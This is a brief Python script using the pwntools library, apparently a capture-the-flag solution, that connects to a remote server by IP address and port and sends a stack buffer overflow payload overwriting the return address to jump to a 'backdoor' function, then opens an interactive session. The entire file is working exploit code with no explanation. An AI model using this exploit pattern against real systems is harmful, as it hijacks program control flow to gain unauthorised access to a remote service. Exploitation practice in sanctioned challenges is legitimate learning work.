from pwn import *


r = remote('61.147.171.105', 58881)

backdoor = 0x400762
main_addr = 0x400778

payload = b'A' * 0xA0 + p64(0) + p64(backdoor) + p64(main_addr)
r.sendlineafter(b'that??', payload)
r.interactive()